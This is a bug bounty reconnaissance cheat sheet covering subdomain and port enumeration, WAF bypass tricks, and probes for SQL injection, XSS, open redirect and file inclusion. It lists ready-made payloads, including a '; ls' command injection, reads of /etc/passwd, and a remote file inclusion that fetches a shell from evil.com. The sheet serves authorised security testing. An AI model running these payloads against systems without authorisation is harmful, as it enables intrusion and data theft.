# Bug Bounty Recon Cheat Sheet

## **Recon Basics**
### Tools for Recon:
1. **Subdomain Enumeration:**
   - Tools: `Sublist3r`, `Amass`, `assetfinder`, `crt.sh`.
   - Commands:
     ```bash
     sublist3r -d example.com
     amass enum -passive -d example.com
     assetfinder --subs-only example.com
     curl -s 'https://crt.sh/?q=%.example.com&output=json' | jq '.'
     ```

2. **DNS Discovery:**
   - Tools: `dnsrecon`, `dnsenum`, `dig`.
   - Commands:
     ```bash
     dnsrecon -d example.com
     dnsenum example.com
     dig example.com any
     ```

3. **Find Open Ports:**
   - Tools: `nmap`, `masscan`.
   - Commands:
     ```bash
     nmap -sV -sC -oN nmap_scan.txt example.com
     masscan -p1-65535 --rate 1000 -oL masscan_output.txt example.com
     ```

4. **Gather Web Files:**
   - Tools: `gau`, `waybackurls`, `hakrawler`.
   - Commands:
     ```bash
     gau example.com > urls.txt
     waybackurls example.com | tee wayback.txt
     hakrawler -url https://example.com -plain
     ```

5. **JavaScript Files:**
   - Extract and analyze JavaScript files for sensitive information:
     ```bash
     grep -Eo '(https?:\/\/[^"\'> ]+\.js)' urls.txt | tee js_files.txt
     ```
   - Analyze with `linkfinder`:
     ```bash
     python3 linkfinder.py -i example.js -o cli
     ```

---

## **Bypass WAF Techniques**
1. **Headers Manipulation:**
   - Add random headers to bypass basic filters:
     ```
     X-Original-URL: /admin
     X-Forwarded-For: 127.0.0.1
     ```

2. **Encoding Payloads:**
   - URL Encoding: Replace characters with `%XX` values.
   - Double Encoding: Encode twice to bypass simple filters.
     ```
     %2527 instead of '
     ```

3. **Case Alterations:**
   - Mix lowercase and uppercase letters:
     ```
     SeLeCt * fRoM users
     ```

4. **Append Null Bytes:**
   - Add `%00` or `/../` to break patterns.
     ```
     /path/%00
     ```

---

## **Vulnerability-Specific Recon**

### 1. **SQL Injection**
- **Recon Steps:**
  - Identify parameters in GET/POST requests.
  - Check for errors with payloads like `\'`, `"`, or `;`.
  - Tools: `sqlmap`.
    ```bash
    sqlmap -u "https://example.com/page?id=1" --batch
    ```

### 2. **Cross-Site Scripting (XSS)**
- **Recon Steps:**
  - Find user input fields.
  - Check for HTML injection by submitting:
    ```
    <script>alert(1)</script>
    ```
  - Tools: `XSStrike`, `dalfox`.
    ```bash
    xsstrike -u "https://example.com"
    dalfox url "https://example.com" --crawl
    ```

### 3. **Open Redirect**
- **Recon Steps:**
  - Look for `url=`, `redirect=`, `next=` parameters.
  - Test with external URLs like:
    ```
    https://example.com?url=https://evil.com
    ```

### 4. **File Inclusion (LFI/RFI)**
- **Recon Steps:**
  - Look for file parameters (e.g., `file=`, `page=`).
  - Test payloads:
    ```
    ../../../../etc/passwd
    http://evil.com/shell.txt
    ```
  - Tools: `fimap`, `LFISuite`.

---

## **Practical Recon Workflow**
1. **Discover Subdomains:**
   - Use `Amass` and `crt.sh` to build a list.
2. **Identify Active Hosts:**
   - Use `httprobe` to filter out live domains.
     ```bash
     cat subdomains.txt | httprobe > live_hosts.txt
     ```
3. **Extract Parameters:**
   - Combine `gau` and `waybackurls` for historical data.
4. **Analyze Endpoints:**
   - Check for XSS, LFI, and SQLi in captured URLs.
5. **Test Authentication and Session Handling:**
   - Use tools like `Burp Suite` to manipulate cookies and tokens.
6. **Fingerprint Technologies:**
   - Use `whatweb` or `wappalyzer` to identify the tech stack.

---

## **Useful Payloads**
- **XSS:** `<svg/onload=alert(1)>`
- **SQLi:** `' OR 1=1 --`
- **LFI:** `../../../../etc/passwd`
- **Command Injection:** `; ls`

---

## **Notes**
1. Always respect the rules of the bounty program.
2. Report findings responsibly and provide detailed reproduction steps.
3. Keep your tools updated to ensure compatibility and effectiveness.

